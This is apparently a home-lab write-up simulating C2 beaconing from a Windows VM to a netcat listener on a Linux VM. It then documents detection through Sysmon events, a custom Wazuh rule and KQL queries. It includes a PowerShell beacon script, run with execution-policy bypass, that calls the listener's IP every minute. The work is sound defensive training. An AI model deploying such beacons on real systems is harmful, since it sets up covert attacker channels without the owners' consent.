# Phase 2: Scenario 3 - External Beaconing

## Attack Overview
- **Description**: Simulated a malicious process on the Windows VM establishing periodic network connections to the Arch Linux VM, mimicking C2 communication typical of malware or backdoors. This represents an insider threat or compromised system beaconing to an attacker-controlled server.
- **MITRE ATT&CK**: 
  - [T1071.001 - Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001/)
  - [T1571 - Non-Standard Port](https://attack.mitre.org/techniques/T1571/)
- **Objective**: Demonstrate detection of suspicious network connections using Sysmon and Wazuh on Windows.
- **Date and Time**: June 15, 2025, ~12:04 AM IST

## Simulation Details
- **Environment**: 
  - **Target**: Windows 10 (hostname: `DESKTOP-FF0MPJM`, IP: `192.168.1.36`, Wazuh agent: `SIEM-Target-Windows`).
  - **Attacker**: Script executed locally; Arch Linux (IP: `192.168.1.2`) as C2 server.
- **Sysmon Config**: SwiftOnSecurity `sysmonconfig-export.xml`.
- **Simulation Command From Arch Linux (C2 Setup)**:
  ```bash
  nc -l -p 8080 > /tmp/c2_log.txt
  ```
- **Simulation Command From Windows**:
  In PowerShell:
  ```powershell
  $script = @'
  while ($true) {
      try {
          $client = New-Object System.Net.Sockets.TcpClient("192.168.1.2", 8080)
          $stream = $client.GetStream()
          $writer = New-Object System.IO.StreamWriter($stream)
          $writer.WriteLine("Beacon from $env:COMPUTERNAME at $(Get-Date)")
          $writer.Flush()
          $stream.Close()
          $client.Close()
      } catch {}
      Start-Sleep -Seconds 60
  }
'@
  Set-Content -Path C:\Temp\beacon.ps1 -Value $script
  powershell -ExecutionPolicy Bypass -File C:\Temp\beacon.ps1
  ```
- **Execution**:
  1. Started a Netcat listener on Arch Linux.
  2. Created and executed `beacon.ps1` on Windows, connecting to `192.168.1.2:8080` every 60 seconds.
  3. Verified connections: `cat /tmp/c2_log.txt`.
  4. Stopped script after ~5 minutes.
- **Expected Events**:
  - **Sysmon Event ID 11**: File creation of `C:\Temp\beacon.ps1`.
  - **Sysmon Event ID 1**: Process creation of `powershell.exe`.
  - **Sysmon Event ID 3**: Network connections to `192.168.1.2:8080`.
  - **Wazuh**: Alerts triggered by rule ID 123456.

## Detection in Wazuh
- **Wazuh Rule**: Rule ID 123456 (from `custom_rules.xml`):
  ```xml
  <rule id="123456" level="12">
    <if_sid>61603</if_sid>
    <field name="sysmon.destination_ip">192\.168\.1\.2</field>
    <field name="sysmon.destination_port">8080</field>
    <description>Potential beaconing to attacker IP</description>
    <mitre>
      <id>T1071.001</id>
    </mitre>
  </rule>
  ```
- **Search Query** (Wazuh Dashboard > Security Events > Discover):
  ```kql
  rule.id:123456 AND agent.name:SIEM-Target-Windows AND sysmon.destination_ip:"192.168.1.2" AND sysmon.destination_port:8080
  ```
- **Findings**:
  - Observed 1+ alerts with `rule.id:123456`.
  - Sysmon Event ID 3 logged connections to `192.168.1.2:8080`.
  - Event ID 11 logged file creation.
  - Event ID 1 captured `powershell.exe`.
  - `rule.level:12` indicates high-severity.
- **Screenshots**:
  - `Screenshots/wazuh_alerts_beacon.png`: Wazuh Dashboard alert list.
  - `Screenshots/sysmon_log_beacon.png`: Sysmon events in Event Viewer.
  - `Screenshots/powershell_beacon_output.png`: PowerShell execution.
- **Logs**:
  - `Logs/sysmon_events_beacon.evtx`: Exported Sysmon logs.
  - `Logs/wazuh_agent_filtered_beacon.log`: Wazuh agent logs.

## Learnings
- **Blue Teaming Insight**: Periodic connections to non-standard ports indicate C2 activity. Sysmon’s network logging and Wazuh’s rules detect beaconing.
- **Challenges**: Legitimate apps using port 8080 may cause false positives; filtering by IP and process reduces noise.
- **Technical Growth**: Learned to simulate C2 beaconing, analyze Sysmon network events, and refine Wazuh queries.
- **Best Practice**: Monitor non-standard ports and set alerts for repeated connections.

## Detection Logic Query
```kql
rule.id:123456 AND agent.name:SIEM-Target-Windows AND sysmon.destination_ip:"192.168.1.2" AND sysmon.destination_port:8080
```
- **Purpose**: Identifies beaconing to `192.168.1.2:8080`.
- **Outcome**: High-severity alert for C2 activity.

## References
- [MITRE ATT&CK: Application Layer Protocol](https://attack.mitre.org/techniques/T1071/001/)
- [MITRE ATT&CK: Non-Standard Port](https://attack.mitre.org/techniques/T1571/)
- [Wazuh Documentation: Sysmon Integration](https://documentation.wazuh.com/current/user-manual/ruleset/sysmon.html)

## Attachments
- **Logs**: [/home/user/Phase2/Scenario-3-ExternalBeaconing/Logs/](/DetectAndDefend/phase2/External%20Beaconing/logs/log1.json)
- **Screenshots**:
  1. [Attack Simulation in PowerShell](/DetectAndDefend/phase2/External%20Beaconing/screenshots/powershell-executuion.png)
  2. [Wazuh Dashboard with Event Logs](/DetectAndDefend/phase2/External%20Beaconing/screenshots/wazuh-dashboard-logs.png)
  3. [Wazuh Dashboard with Event Logs Only](/DetectAndDefend/phase2/External%20Beaconing/screenshots/wazuh-log-deatiled.png)
  4. [ Beacon Host ](/DetectAndDefend/phase2/External%20Beaconing/screenshots/Beacon-Host.png)